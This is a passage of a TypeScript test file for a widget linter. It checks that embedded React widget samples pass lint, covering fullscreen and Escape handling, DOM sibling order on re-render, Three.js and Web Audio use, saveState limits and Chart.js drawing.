    window.indirectUi?.saveState?.({ best: s.tick() + w });
    (globalThis as any).indirectUi?.saveState?.({ ok: true });
    try { throw new Error("ignored"); } catch {}
  }, []);
  return <div className="gu-root">es2022 ok</div>;
}`;
    const res = await runWidgetLint({ id: "t-es2022", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("onFullscreen returns an unsubscribe function and deferred Escape respects game preventDefault", async () => {
    const src = `export default function App() {
  useEffect(() => {
    let calls = 0;
    const unsub = window.__gu.onFullscreen(() => { calls++; });
    if (typeof unsub !== "function") throw new Error("onFullscreen must return unsubscribe fn");
    unsub();
    // Simulate a widget handling Escape synchronously in fullscreen
    let escapePosted = false;
    const onMsg = (ev: MessageEvent) => { if (ev.data && ev.data.__gu === "escape") escapePosted = true; };
    window.addEventListener("message", onMsg);
    const onEsc = (ev: KeyboardEvent) => { if (ev.key === "Escape") ev.preventDefault(); };
    window.addEventListener("keydown", onEsc);
    window.postMessage({ __gu: "fullscreen", expanded: true }, "*");
    const t1 = setTimeout(() => {
      if (!window.__gu.isFullscreen) throw new Error("fullscreen message did not activate");
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", cancelable: true }));
    }, 20);
    const t2 = setTimeout(() => {
      if (calls !== 0) throw new Error("unsubscribed onFullscreen still fired");
      if (escapePosted) throw new Error("preventDefault'd Escape should not post escape exit");
    }, 60);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      window.removeEventListener("keydown", onEsc);
      window.removeEventListener("message", onMsg);
    };
  }, []);
  return <div className="gu-root">fs ok</div>;
}`;
    const res = await runWidgetLint({ id: "t-fs-esc", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("reconciler preserves DOM sibling order across state re-renders with component and fragment children", async () => {
    // Regression guard for the Studio Loft sidebar bug: a leading plain DOM
    // header followed by function components + a fragment must NEVER teleport
    // to the bottom of the container on state updates.
    const src = `import { useState, useEffect, Fragment } from "react";

function ChildA({ v }: { v: number }) {
  return <div data-item="A">A:{v}</div>;
}
function ChildB({ v, extra }: { v: number; extra: boolean }) {
  return (
    <Fragment>
      <div data-item="B1">B1:{v}</div>
      {extra ? <div data-item="B2">B2</div> : null}
    </Fragment>
  );
}

export default function App() {
  const [tick, setTick] = useState(0);
  useEffect(() => {
    const order = () =>
      Array.from(document.querySelectorAll("#panel [data-item]")).map((el) => el.getAttribute("data-item"));
    if (tick === 0) {
      if (order().join(",") !== "Header,A,B1,Footer") {
        throw new Error("initial order wrong: " + order().join(","));
      }
      setTick(1);
    } else if (tick === 1) {
      if (order().join(",") !== "Header,A,B1,B2,Footer") {
        throw new Error("rerender 1 order wrong: " + order().join(","));
      }
      setTick(2);
    } else if (tick === 2) {
      if (order().join(",") !== "Header,A,B1,Footer") {
        throw new Error("rerender 2 order wrong: " + order().join(","));
      }
    }
  }, [tick]);
  return (
    <div className="gu-root">
      <div id="panel" className="gu-panel">
        <div data-item="Header">ENVELOPE</div>
        <ChildA v={tick} />
        <ChildB v={tick} extra={tick === 1} />
        <div data-item="Footer">END</div>
      </div>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t-reconciler-order", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);

  test("3D Kart/FPS primitives, pointerLock safety, Web Audio Analyser time-domain + nodes, touch probe, and saveState contract pass lint", async () => {
    const src = `import { useEffect, useRef } from "react";
import * as THREE from "three";

export default function App(props: { level?: number; gold?: number }) {
  const c2 = useRef<HTMLCanvasElement | null>(null);
  const c3 = useRef<HTMLCanvasElement | null>(null);
  useEffect(() => {
    // 1. Mobile touch detection without bare-global false positive
    const _touch = "ontouchstart" in window || (navigator.maxTouchPoints ?? 0) > 0;
    // 2. Canvas2D roundRect + raycaster ImageData buffer
    const ctx2 = c2.current!.getContext("2d")!;
    ctx2.beginPath();
    (ctx2 as any).roundRect(2, 2, 28, 28, 6);
    ctx2.stroke();
    const img = ctx2.createImageData(32, 32);
    new Uint32Array(img.data.buffer)[0] = 0xff22cc88;
    ctx2.putImageData(img, 0, 0);
    // 3. Sandboxed pointerLock degrades cleanly (never throws or rejects unhandled)
    const pl = c2.current!.requestPointerLock();
    if (pl && typeof (pl as any).then === "function") (pl as any).then(() => {});
    document.exitPointerLock();
    // 4. Web Audio synth + AnalyserNode time-domain + ConstantSource + ChannelSplitter/Merger
    const AC = window.AudioContext || (window as any).webkitAudioContext;
    const ac = new AC();
    const an = ac.createAnalyser();
    an.fftSize = 256;
    const byteTime = new Uint8Array(an.frequencyBinCount || 128);
    const floatTime = new Float32Array(an.frequencyBinCount || 128);
    an.getByteTimeDomainData(byteTime);
    an.getFloatTimeDomainData(floatTime);
    if (byteTime[0] !== 128) throw new Error("expected neutral byte time-domain fill");
    const cs = ac.createConstantSource();
    cs.offset.setValueAtTime(0.5, ac.currentTime);
    const split = ac.createChannelSplitter(2);
    const merge = ac.createChannelMerger(2);
    cs.connect(split);
    split.connect(merge);
    merge.connect(an).connect(ac.destination);
    // 5. saveState contract: returns boolean, updates window.__gu.state, rejects non-objects/oversized
    const savedOk = window.indirectUi.saveState({ level: (props.level ?? 1) + 1, gold: (props.gold ?? 0) + 50, inv: ["blade"] });
    if (savedOk !== true) throw new Error("saveState should return true for valid object");
    if ((window.__gu.state as any).level !== 2 || (window.__gu.state as any).gold !== 50) {
      throw new Error("window.__gu.state was not updated by saveState");
    }
    if ((window.indirectUi.saveState as any)([1, 2]) !== false) throw new Error("saveState should reject arrays");
    if (window.indirectUi.saveState({ huge: "x".repeat(70000) }) !== false) throw new Error("saveState should reject >64KB");
    // 6. 3D Kart & FPS Three.js primitives (CanvasTexture, TubeGeometry, ExtrudeGeometry, InstancedMesh, FogExp2, Sprite)
    const renderer = new THREE.WebGLRenderer({ canvas: c3.current!, antialias: true });
    renderer.shadowMap.enabled = true;
    renderer.setSize(320, 200, false);
    const scene = new THREE.Scene();
    scene.fog = new THREE.FogExp2(0x101828, 0.015);
    const cam = new THREE.PerspectiveCamera(65, 320 / 200, 0.1, 200);
    cam.position.set(0, 4, 10);
    const tex = new THREE.CanvasTexture(c2.current!);
    const curve = new THREE.CatmullRomCurve3([
      new THREE.Vector3(0, 0, 0),
      new THREE.Vector3(10, 0, 5),
      new THREE.Vector3(0, 0, 15),
      new THREE.Vector3(-10, 0, 5),
    ], true);
    scene.add(new THREE.Mesh(new THREE.TubeGeometry(curve, 24, 1.4, 8, true), new THREE.MeshStandardMaterial({ map: tex })));
    const shape = new THREE.Shape();
    shape.moveTo(0, 0); shape.lineTo(1, 0); shape.lineTo(1, 1); shape.closePath();
    scene.add(new THREE.Mesh(new THREE.ExtrudeGeometry(shape, { depth: 0.4, bevelEnabled: false }), new THREE.MeshStandardMaterial({ color: 0xff5522 })));
    const inst = new THREE.InstancedMesh(new THREE.BoxGeometry(0.5, 1, 0.5), new THREE.MeshStandardMaterial({ color: 0x22cc88 }), 8);
    const m = new THREE.Matrix4();
    for (let i = 0; i < 8; i++) { m.makeTranslation(i, 0, 0); inst.setMatrixAt(i, m); }
    inst.instanceMatrix.needsUpdate = true;
    scene.add(inst);
    scene.add(new THREE.Sprite(new THREE.SpriteMaterial({ map: tex })));
    scene.add(new THREE.HemisphereLight(0xffffff, 0x444444, 1.2));
    renderer.render(scene, cam);
    return () => {
      try { ac.close(); } catch {}
      tex.dispose();
      renderer.dispose();
    };
  }, []);
  return (
    <div className="gu-game-stage">
      <canvas ref={c2} width={32} height={32} className="gu-canvas-interactive" />
      <canvas ref={c3} width={320} height={200} className="gu-canvas-interactive" />
      <div className="gu-touch-controls">
        <div className="gu-dpad">
          <button className="gu-touch-btn" type="button">W</button>
        </div>
        <button className="gu-touch-btn-primary gu-touch-btn-round" type="button">GO</button>
      </div>
    </div>
  );
}`;
    const res = await runWidgetLint({ id: "t-wave2-3d-save", source: src, state: '{"level": 1, "gold": 0}' });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
    expect((res.notes || []).some((n) => n.includes("3D exercised"))).toBe(true);
  }, 60_000);

  test("Chart.js smooth curved line (Path2D.bezierCurveTo / quadraticCurveTo / ellipse / roundRect) and Canvas2D getTransform/reset pass lint", async () => {
    const src = `import { useEffect, useRef } from "react";
import Chart from "chart";

export default function App() {
  const ref = useRef<HTMLCanvasElement | null>(null);
  useEffect(() => {
    const canvas = ref.current!;
    const ctx = canvas.getContext("2d")!;
    const m = ctx.getTransform();
    if (!m || typeof m.a !== "number") throw new Error("getTransform missing");
    const p = new Path2D();
    p.moveTo(0, 0);
    p.bezierCurveTo(10, 20, 30, 20, 40, 0);
    p.quadraticCurveTo(50, 10, 60, 0);
    p.arcTo(70, 0, 70, 10, 4);
    p.ellipse(20, 20, 10, 6, 0, 0, Math.PI * 2);
    p.roundRect(2, 2, 16, 12, 3);
    const chart = new Chart(canvas, {
      type: "line",
      data: {
        labels: ["M0", "M6", "M12", "M18", "M24"],
        datasets: [{ label: "ARR", data: [10, 22, 39, 55, 74], tension: 0.35, fill: true }],
      },
      options: { responsive: false, animation: false },
    });
    return () => chart.destroy();
  }, []);
  return <div className="gu-root"><canvas ref={ref} width={320} height={180} /></div>;
}`;
    const res = await runWidgetLint({ id: "t-chart-path2d", source: src });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  }, 60_000);
});
